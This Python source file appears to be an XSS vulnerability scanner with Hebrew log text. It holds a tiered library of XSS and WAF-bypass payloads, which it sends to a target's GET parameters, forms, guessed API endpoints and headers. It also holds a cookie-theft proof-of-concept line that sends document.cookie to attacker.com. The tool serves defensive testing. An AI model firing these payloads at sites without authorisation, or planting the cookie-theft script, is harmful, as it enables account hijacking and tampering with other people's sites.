"""
XSS Scanner
-----------
Comprehensive Cross-Site Scripting detection:
  - Reflected XSS (GET/POST parameters)
  - Stored XSS (forms, comment fields)
  - DOM-based XSS (URL fragments, document.write sinks)
  - WAF bypass payload rotation
  - Context-aware payload selection (HTML/attr/JS/CSS)
  - Cookie theft PoC generation
"""

import asyncio
import re
import html
from dataclasses import dataclass, field
from typing import Callable, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

import aiohttp

# ── Data model ────────────────────────────────────────────────────────────────

@dataclass
class Finding:
    severity: str
    category: str
    title: str
    description: str
    evidence: list = field(default_factory=list)
    recommendation: str = ""
    tags: list = field(default_factory=list)

    def to_dict(self):
        return {
            "severity": self.severity,
            "category": self.category,
            "title": self.title,
            "description": self.description,
            "evidence": self.evidence,
            "recommendation": self.recommendation,
            "tags": self.tags,
        }

# ── Payload library ────────────────────────────────────────────────────────────

# Unique canary to identify reflection without actual script execution
CANARY = "xss7z9probe"

# Tier 1 — basic (will catch most unprotected apps)
_TIER1 = [
    f'<script>alert("{CANARY}")</script>',
    f'<img src=x onerror=alert("{CANARY}")>',
    f'<svg onload=alert("{CANARY}")>',
    f'"><script>alert("{CANARY}")</script>',
    f"'><script>alert('{CANARY}')</script>",
    f'javascript:alert("{CANARY}")',
]

# Tier 2 — attribute context / filter bypasses
_TIER2 = [
    f'" onmouseover="alert(`{CANARY}`)" x="',
    f"' onfocus='alert(`{CANARY}`)' autofocus x='",
    f'<img src=1 oNeRrOr=alert("{CANARY}")>',
    f'<SCRIPT>alert("{CANARY}")</SCRIPT>',
    f'<scr\x00ipt>alert("{CANARY}")</scr\x00ipt>',
    f'<img """><script>alert("{CANARY}")</script>">',
    f'<iframe src="javascript:alert(`{CANARY}`)">',
    f'<details open ontoggle=alert("{CANARY}")>',
    f'<body onpageshow=alert("{CANARY}")>',
]

# Tier 3 — WAF bypass / encoding tricks
_TIER3 = [
    f'<svg/onload=&#97;&#108;&#101;&#114;&#116;("{CANARY}")>',
    f'<img src=x onerror=eval(atob("YWxlcnQoJ3hzczdaOXByb2JlJyk="))>',
    f'%3Cscript%3Ealert%28%22{CANARY}%22%29%3C%2Fscript%3E',
    f'\\u003cscript\\u003ealert("{CANARY}")\\u003c/script\\u003e',
    f'<math><mtext></p><script>alert("{CANARY}")</script>',
    f'<object data="data:text/html,<script>alert(\'{CANARY}\')</script>">',
    f'<iframe srcdoc="<script>alert(\'{CANARY}\')</script>">',
    # Polyglot
    f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{CANARY}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{CANARY}')//>>",
]

# Stored XSS test bodies (sent as POST to forms)
_STORED_PAYLOADS = [
    f'<script>alert("{CANARY}")</script>',
    f'<img src=x onerror=alert("{CANARY}")>',
    f'"><svg onload=alert("{CANARY}")>',
]

# DOM sinks
_DOM_SOURCES = ["#", "#xss", "?q=", "?search=", "?name=", "?redirect=", "?url=", "?page="]

_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,*/*",
}

# ── HTTP helpers ───────────────────────────────────────────────────────────────

_TIMEOUT = aiohttp.ClientTimeout(total=15)

async def _get(session: aiohttp.ClientSession, url: str, **kw) -> Optional[aiohttp.ClientResponse]:
    try:
        kw.setdefault("ssl", False)
        kw.setdefault("allow_redirects", True)
        return await session.get(url, headers=_HEADERS, timeout=_TIMEOUT, **kw)
    except Exception:
        return None

async def _post(session: aiohttp.ClientSession, url: str, data: dict, **kw) -> Optional[aiohttp.ClientResponse]:
    try:
        kw.setdefault("ssl", False)
        return await session.post(url, headers=_HEADERS, data=data, timeout=_TIMEOUT, **kw)
    except Exception:
        return None

async def _text(resp) -> str:
    if resp is None:
        return ""
    try:
        return await resp.text(errors="replace")
    except Exception:
        return ""

# ── Context detection ──────────────────────────────────────────────────────────

def _detect_reflection_context(body: str, value: str) -> str:
    """Detect where in the HTML body the value is reflected."""
    idx = body.find(value)
    if idx == -1:
        return "none"
    snippet = body[max(0, idx - 60): idx + len(value) + 60]
    if re.search(r'<script[^>]*>', snippet[:60], re.I):
        return "js_context"
    if re.search(r'on\w+\s*=\s*["\']?[^"\']*$', snippet[:60]):
        return "attr_event"
    if re.search(r'<[a-z]+[^>]+\s+\w+=("[^"]*$|\'[^\']*$)', snippet[:60]):
        return "attr_value"
    if re.search(r'<!--', snippet[:60]):
        return "html_comment"
    return "html_body"

def _is_reflected_unescaped(body: str, payload: str) -> bool:
    """Check if the full payload appears verbatim in the response."""
    return payload in body

def _is_canary_reflected(body: str) -> bool:
    return CANARY in body

# ── Form extraction ───────────────────────────────────────────────────────────

_FORM_RE = re.compile(r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*>(.*?)</form>', re.I | re.S)
_INPUT_RE = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?', re.I)
_TEXTAREA_RE = re.compile(r'<textarea[^>]*name=["\']([^"\']+)["\']', re.I)
_METHOD_RE = re.compile(r'<form[^>]*method=["\']?(\w+)["\']?', re.I)

def _extract_forms(base_url: str, html_body: str) -> list[dict]:
    forms = []
    for m in _FORM_RE.finditer(html_body):
        action_raw = m.group(1).strip() or base_url
        action = urljoin(base_url, action_raw)
        form_html = m.group(2)
        method_m = _METHOD_RE.search(m.group(0))
        method = (method_m.group(1).upper() if method_m else "GET")
        fields: dict[str, str] = {}
        for inp in _INPUT_RE.finditer(form_html):
            fields[inp.group(1)] = inp.group(2) or ""
        for ta in _TEXTAREA_RE.finditer(form_html):
            fields[ta.group(1)] = ""
        if fields:
            forms.append({"action": action, "method": method, "fields": fields})
    return forms

# ── Scanner ───────────────────────────────────────────────────────────────────

class XSSScanner:
    def __init__(self, url: str, cookies: str = "", log: Optional[Callable] = None, extra_headers: dict = None):
        self.url = url if url.startswith("http") else f"https://{url}"
        self.parsed = urlparse(self.url)
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.cookies_str = cookies
        self._log = log or (lambda m: None)
        self._extra_headers = extra_headers or {}
        self.findings: list[Finding] = []
        self._tested_urls: set[str] = set()

    def _make_session(self) -> aiohttp.ClientSession:
        hdrs = {**_HEADERS, **self._extra_headers}
        if self.cookies_str:
            hdrs["Cookie"] = self.cookies_str
        return aiohttp.ClientSession(headers=hdrs)

    # ── Phase 1: Reflected XSS via GET params ─────────────────────────────────

    async def _test_reflected_get(self, session: aiohttp.ClientSession):
        self._log("XSS: בודק פרמטרי GET (Reflected)...")
        qs = parse_qs(self.parsed.query)
        if not qs:
            # Try injecting common param names if no query string
            test_params = ["q", "search", "s", "query", "keyword", "name", "id", "page", "url", "redirect", "next", "ref", "input", "data", "value", "text", "msg", "message", "comment"]
            qs = {p: ["test"] for p in test_params[:8]}

        all_payloads = _TIER1 + _TIER2 + _TIER3
        found_params: set[str] = set()

        for param in list(qs.keys()):
            for payload in all_payloads:
                modified_qs = dict(qs)
                modified_qs[param] = [payload]
                new_query = urlencode({k: v[0] for k, v in modified_qs.items()})
                test_url = urlunparse(self.parsed._replace(query=new_query))

                if test_url in self._tested_urls:
                    continue
                self._tested_urls.add(test_url)

                resp = await _get(session, test_url)
                body = await _text(resp)

                if _is_reflected_unescaped(body, payload):
                    context = _detect_reflection_context(body, payload)
                    if param not in found_params:
                        found_params.add(param)
                        self._log(f"XSS קריטי: Reflected XSS בפרמטר '{param}' — {context}")
                        self.findings.append(Finding(
                            severity="critical",
                            category="XSS",
                            title=f"Reflected XSS — פרמטר: {param}",
                            description=f"הפרמטר '{param}' משקף את הקלט ישירות לדף HTML ללא סינון. תוקף יכול לשלוח קישור עם payload זדוני.",
                            evidence=[
                                f"URL: {test_url}",
                                f"Payload: {payload}",
                                f"Context: {context}",
                                f"Cookie Theft PoC: <script>fetch('https://attacker.com/?c='+document.cookie)</script>",
                            ],
                            recommendation="השתמש ב-output encoding (htmlspecialchars / DOMPurify). הגדר Content-Security-Policy.",
                            tags=["xss", "reflected", param, context],
                        ))
                    break  # Next param

                elif _is_canary_reflected(body):
                    # Partial reflection — encoded but canary present
                    if param not in found_params:
                        self._log(f"XSS בינוני: Canary reflected (encoded) בפרמטר '{param}'")
                        self.findings.append(Finding(
                            severity="medium",
                            category="XSS",
                            title=f"Partial Reflection (HTML-encoded) — פרמטר: {param}",
                            description=f"הפרמטר '{param}' משקף קלט אך מקודד חלקית. ייתכן שניתן לעקוף.",
                            evidence=[f"URL: {test_url}", f"Canary '{CANARY}' נמצא בתגובה"],
                            recommendation="בדוק encoding מלא ועקבי. השתמש ב-DOMPurify.",
                            tags=["xss", "partial-reflection", param],
                        ))
                    break

    # ── Phase 2: Reflected XSS via POST forms ─────────────────────────────────

    async def _test_reflected_post(self, session: aiohttp.ClientSession):
        self._log("XSS: מחלץ טפסים ובודק POST (Reflected/Stored)...")
        resp = await _get(session, self.url)
        body = await _text(resp)
        forms = _extract_forms(self.url, body)
        self._log(f"XSS: נמצאו {len(forms)} טפסים")

        for form in forms:
            for field_name in list(form["fields"].keys()):
                for payload in _TIER1 + _TIER2:
                    test_data = dict(form["fields"])
                    test_data[field_name] = payload

                    if form["method"] == "POST":
                        resp2 = await _post(session, form["action"], test_data)
                    else:
                        qs = urlencode(test_data)
                        test_url = f"{form['action']}?{qs}"
                        resp2 = await _get(session, test_url)

                    body2 = await _text(resp2)

                    if _is_reflected_unescaped(body2, payload):
                        self._log(f"XSS קריטי: Reflected/Stored XSS בטופס → שדה '{field_name}'")
                        self.findings.append(Finding(
                            severity="critical",
                            category="XSS",
                            title=f"XSS בטופס — שדה: {field_name}",
                            description=f"שדה הקלט '{field_name}' בטופס ({form['method']} {form['action']}) משקף payload XSS ישירות לדף.",
                            evidence=[
                                f"Form action: {form['action']}",
                                f"Method: {form['method']}",
                                f"Field: {field_name}",
                                f"Payload: {payload}",
                            ],
                            recommendation="encode כל קלט משתמש ב-server side. השתמש ב-DOMPurify בצד לקוח.",
                            tags=["xss", "form", form["method"].lower(), "reflected"],
                        ))
                        break

    # ── Phase 3: Stored XSS — probe common endpoints ──────────────────────────

    async def _test_stored_endpoints(self, session: aiohttp.ClientSession):
        self._log("XSS: בודק נקודות Stored XSS נפוצות...")
        stored_endpoints = [
            ("/api/comments", {"text": "{p}", "comment": "{p}", "content": "{p}"}),
            ("/api/posts", {"title": "{p}", "body": "{p}", "content": "{p}"}),
            ("/api/reviews", {"text": "{p}", "review": "{p}"}),
            ("/api/messages", {"message": "{p}", "body": "{p}", "content": "{p}"}),
            ("/api/profile", {"name": "{p}", "bio": "{p}", "username": "{p}"}),
            ("/api/feedback", {"feedback": "{p}", "message": "{p}"}),
            ("/comment", {"comment": "{p}", "text": "{p}"}),
            ("/review", {"review": "{p}", "content": "{p}"}),
        ]

        for path, field_templates in stored_endpoints:
            url = f"{self.base}{path}"
            for field_name, val_tmpl in field_templates.items():
                payload = _STORED_PAYLOADS[0]
                data = {field_name: val_tmpl.replace("{p}", payload)}
                resp = await _post(session, url, data)
                if resp and resp.status in (200, 201):
                    body = await _text(resp)
                    if _is_canary_reflected(body) or _is_reflected_unescaped(body, payload):
                        self._log(f"XSS קריטי: Stored XSS → {path} שדה '{field_name}'")
                        self.findings.append(Finding(
                            severity="critical",
                            category="XSS",
                            title=f"Stored XSS — {path}",
                            description=f"Endpoint {path} מקבל ושומר payload XSS ללא סינון. הממצא הזה מסוכן במיוחד כי משפיע על כל משתמש שצופה בתוכן.",
                            evidence=[
                                f"Endpoint: POST {url}",
                                f"Field: {field_name}",
                                f"Payload: {payload}",
                                f"Status: {resp.status}",
                            ],
                            recommendation="Sanitize תוכן ב-server side לפני שמירה. השתמש ב-DOMPurify בהצגה.",
                            tags=["xss", "stored", "critical"],
                        ))
                        break

    # ── Phase 4: DOM XSS — check JS sinks ─────────────────────────────────────

    async def _test_dom_xss(self, session: aiohttp.ClientSession):
        self._log("XSS: בודק DOM-based XSS sinks בקוד JS...")
        resp = await _get(session, self.url)
        body = await _text(resp)

        # Check inline JS for dangerous sinks
        js_sinks = [
            (r'document\.write\s*\(', "document.write"),
            (r'innerHTML\s*=', "innerHTML"),
            (r'outerHTML\s*=', "outerHTML"),
            (r'eval\s*\(', "eval()"),
            (r'setTimeout\s*\(\s*["\']', "setTimeout(string)"),
            (r'setInterval\s*\(\s*["\']', "setInterval(string)"),
            (r'location\s*=\s*[^=]', "location ="),
            (r'location\.href\s*=', "location.href ="),
            (r'window\.location\s*=', "window.location ="),
            (r'\.src\s*=\s*.*(?:location|search|hash)', "src from URL"),
            (r'insertAdjacentHTML', "insertAdjacentHTML"),
        ]

        dom_sources = [
            (r'location\.search', "location.search"),
            (r'location\.hash', "location.hash"),
            (r'location\.href', "location.href"),
            (r'document\.URL', "document.URL"),
            (r'document\.referrer', "document.referrer"),
            (r'window\.name', "window.name"),
        ]

        found_sinks = []
        found_sources = []

        for pattern, name in js_sinks:
            if re.search(pattern, body, re.I):
                found_sinks.append(name)

        for pattern, name in dom_sources:
            if re.search(pattern, body, re.I):
                found_sources.append(name)

        if found_sinks and found_sources:
            self._log(f"XSS גבוה: DOM XSS — sinks: {found_sinks}, sources: {found_sources}")
            self.findings.append(Finding(
                severity="high",
                category="XSS",
                title="DOM-based XSS — Dangerous Sink + Source",
                description=f"הקוד JavaScript משתמש ב-sinks מסוכנים ({', '.join(found_sinks)}) ומקבל input ממקורות URL ({', '.join(found_sources)}). תוקף יכול לשנות URL fragment/query להזרקת קוד.",
                evidence=[
                    f"Sinks: {', '.join(found_sinks)}",
                    f"Sources: {', '.join(found_sources)}",
                    f"URL tested: {self.url}",
                    "PoC: navigate to URL#<img src=x onerror=alert(1)>",
                ],
                recommendation="אל תשתמש ב-innerHTML או document.write עם קלט מ-URL. השתמש ב-textContent. הוסף DOMPurify.",
                tags=["xss", "dom", "javascript"],
            ))
        elif found_sinks:
            self._log(f"XSS בינוני: DOM sinks מסוכנים ללא source ברור — {found_sinks}")
            self.findings.append(Finding(
                severity="medium",
                category="XSS",
                title="DOM Dangerous Sinks Detected",
                description=f"נמצאו sinks מסוכנים בקוד JS: {', '.join(found_sinks)}. דורש בדיקה ידנית.",
                evidence=[f"Sinks: {', '.join(found_sinks)}"],
                recommendation="בדוק מידנית שכל sink מקבל קלט רק ממקורות מהימנים.",
                tags=["xss", "dom"],
            ))

        # Also check for JS files and scan them
        js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', body, re.I)
        for js_url in js_urls[:10]:
            full_js = urljoin(self.url, js_url)
            resp_js = await _get(session, full_js)
            js_body = await _text(resp_js)
            for pattern, name in js_sinks:
                if re.search(pattern, js_body, re.I):
                    for src_pattern, src_name in dom_sources:
                        if re.search(src_pattern, js_body, re.I):
                            self.findings.append(Finding(
                                severity="high",
                                category="XSS",
                                title=f"DOM XSS in External JS — {js_url.split('/')[-1]}",
                                description=f"קובץ JS חיצוני מכיל sink מסוכן '{name}' עם source '{src_name}'.",
                                evidence=[f"File: {full_js}", f"Sink: {name}", f"Source: {src_name}"],
                                recommendation="בדוק את הקוד ב-{js_url} ידנית ותקן את השימוש ב-{name}.",
                                tags=["xss", "dom", "external-js"],
                            ))
                            break

    # ── Phase 5: Header-based XSS ─────────────────────────────────────────────

    async def _test_header_xss(self, session: aiohttp.ClientSession):
        self._log("XSS: בודק Header injection (Referer, User-Agent, X-Forwarded-For)...")
        headers_to_test = {
            "Referer": f'<script>alert("{CANARY}")</script>',
            "X-Forwarded-For": f'<script>alert("{CANARY}")</script>',
            "User-Agent": f'Mozilla/5.0 <script>alert("{CANARY}")</script>',
            "X-Real-IP": f'<script>alert("{CANARY}")</script>',
        }
        for hdr, payload in headers_to_test.items():
            try:
                resp = await session.get(self.url, headers={**_HEADERS, hdr: payload}, ssl=False, timeout=_TIMEOUT)
                body = await _text(resp)
                if _is_reflected_unescaped(body, payload):
                    self._log(f"XSS גבוה: Header XSS ב-{hdr}")
                    self.findings.append(Finding(
                        severity="high",
                        category="XSS",
                        title=f"Header-based XSS — {hdr}",
                        description=f"הכותרת HTTP '{hdr}' מוחזרת לדף ללא encoding. תוקף יכול להזריק JS דרך כותרת.",
                        evidence=[f"Header: {hdr}", f"Payload: {payload}"],
                        recommendation="Encode את ערכי Headers לפני הצגתם בדף.",
                        tags=["xss", "header-injection", hdr.lower()],
                    ))
            except Exception:
                pass

    # ── Phase 6: CSP check ─────────────────────────────────────────────────────

    async def _check_csp(self, session: aiohttp.ClientSession):
        self._log("XSS: בודק Content-Security-Policy...")
        resp = await _get(session, self.url)
        if resp is None:
            return
        csp = resp.headers.get("Content-Security-Policy", "")
        csp_ro = resp.headers.get("Content-Security-Policy-Report-Only", "")

        if not csp and not csp_ro:
            self.findings.append(Finding(
                severity="medium",
                category="XSS",
                title="Missing Content-Security-Policy Header",
                description="האתר לא מגדיר CSP. זה מגדיל את השפעת ממצאי XSS משמעותית.",
                evidence=[f"URL: {self.url}", "Header: Content-Security-Policy — חסר"],
                recommendation="הגדר CSP מחמיר: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'",
                tags=["xss", "csp", "missing-header"],
            ))
        elif csp:
            # Check for unsafe directives
            issues = []
            if "unsafe-inline" in csp:
                issues.append("'unsafe-inline' מאפשר הרצת JS inline")
            if "unsafe-eval" in csp:
                issues.append("'unsafe-eval' מאפשר eval()")
            if "* " in csp or csp.endswith("*"):
                issues.append("wildcard (*) בחלק ממקורות")
            if not issues:
                self._log("XSS: CSP מוגדר ונראה טוב")
            else:
                self.findings.append(Finding(
                    severity="medium",
                    category="XSS",
                    title="CSP Misconfiguration",
                    description=f"CSP מוגדר אבל מכיל הגדרות מסוכנות: {', '.join(issues)}",
                    evidence=[f"CSP: {csp[:300]}", *issues],
                    recommendation="הסר unsafe-inline ו-unsafe-eval. השתמש ב-nonces במקום.",
                    tags=["xss", "csp", "misconfiguration"],
                ))

    # ── Main entry ─────────────────────────────────────────────────────────────

    async def scan(self) -> dict:
        self._log(f"XSS Scanner: מתחיל סריקה על {self.url}")
        async with self._make_session() as session:
            await asyncio.gather(
                self._test_reflected_get(session),
                self._test_dom_xss(session),
                self._check_csp(session),
                self._test_header_xss(session),
            )
            # Sequential — needs page first
            await self._test_reflected_post(session)
            await self._test_stored_endpoints(session)

        critical = [f for f in self.findings if f.severity == "critical"]
        high = [f for f in self.findings if f.severity == "high"]

        self._log(f"XSS Scanner: הושלם — {len(self.findings)} ממצאים ({len(critical)} קריטי, {len(high)} גבוה)")

        return {
            "target": self.url,
            "total": len(self.findings),
            "critical": len(critical),
            "high": len(high),
            "medium": len([f for f in self.findings if f.severity == "medium"]),
            "findings": [f.to_dict() for f in self.findings],
        }


async def scan_xss(url: str, cookies: str = "", log=None, extra_headers: dict = None) -> dict:
    scanner = XSSScanner(url, cookies=cookies, log=log, extra_headers=extra_headers)
    return await scanner.scan()
